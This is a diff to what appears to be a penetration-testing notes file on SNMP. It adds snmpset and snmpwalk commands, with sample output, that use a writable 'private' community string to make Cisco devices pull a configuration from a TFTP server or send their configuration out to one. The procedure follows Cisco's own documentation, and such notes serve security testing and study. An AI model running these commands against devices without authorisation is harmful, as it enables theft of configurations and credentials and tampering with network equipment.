@@ -66,6 +66,56 @@ auxiliary/scanner/snmp/snmp_enum
 1.3.6.1.2.1.25.6.3.1.2	 Software Name 
 1.3.6.1.4.1.77.1.2.25 	User Accounts 
 1.3.6.1.2.1.6.13.1.3   	TCP Local Ports 
+
+# Cisco MIB values for copying a new running config (not tested)
+1.) Set MIB values by name (Must have the Cisco MIBS: CISCO-SMI-V1SMI, SNMPv2-TC-V1SMI, CISCO-CONFIG-COPY-MIB-V1SMI,CISCO-FLASH-MIB-V1SMI)
+snmpset -v 1 -c private <device name> ccCopyProtocol.<random number> integer 1 
+ccCopySourceFileType.<Random number> integer 1 ccCopyDestFileType.<Random number> integer 3 ccCopyServerAddress.<Random number> ipaddress "<server ip address>" ccCopyFileName. <Random number> octetstring "<file name>" ccCopyEntryRowStatus.<Random number> integer 4  
+
+2.) Enter Return and you see this output (111 is the random number in this example):
+
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyProtocol.111 : INTEGER: tftp 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopySourceFileType.111 : INTEGER: networkFile 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyDestFileType.111 : INTEGER: startupConfig 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyServerAddress.111 : IpAddress: 172.17.246.205 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyFileName.111 : 
+        DISPLAY STRING- (ascii):  foo-confg 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyEntryRowStatus.111 : INTEGER: createAndGo  
+
+3.) Check the copy status to verify if the copy is successful.
+snmpwalk <device name> ccCopyState 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyState.111 : INTEGER: running 
+
+4.) Repeat step 3 until you see the status: successful.
+
+        C:\>snmpwalk <device name> ccCopyState 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyState.111 : INTEGER: successful 
+
+5.) Once you get the successful status, you can clear the row entry. In this example, the row is the <random number> that you chose previously.
+snmpset -v 1 -c private <device name> ccCopyEntryRowStatus.111 integer 6 
+        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
+        ccCopyTable.ccCopyEntry.ccCopyEntryRowStatus.111 : INTEGER: destroy 
+
+# To copy config from device and transfer to tftp server complete steps 1-5 and make changes to the following values
+ccCopySourceFileType.<Random number> integer 4 
+ccCopyDestFileType.<Random number> integer 1 
+
+# OID number example
+1.) Set the values
+snmpset -v 1 -c private <device name> .1.3.6.1.4.1.9.9.96.1.1.1.1.2.<Random number> integer 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.<Random number> integer 4 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.<Random number> integer 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.<Random number> ipaddress "<server ip address>" .1.3.6.1.4.1.9.9.96.1.1.1.1.6.<Random number> octetstring "<file name>" .1.3.6.1.4.1.9.9.96.1.1.1.1.14.<Random number> integer 4 
+2.) Check the status
+snmpwalk cognac .1.3.6.1.4.1.9.9.96.1.1.1.1.10
+
+3.) Clear the row
+snmpset -v 1 -c private <device name> .1.3.6.1.4.1.9.9.96.1.1.1.1.14.<Random number> integer 6 
 ```
 
 ## SNMP significant files
@@ -80,6 +130,7 @@ reg query hklm\System\CurrentControlSet\Services\SNMP /s
 2. https://github.com/matrix/snmpv3brute
   *Note: Fork github of applied risk's that extracts to hashcat format
 3. https://github.com/openwall/john
+4. https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#app
 
 ## Miscellaneous
  ```
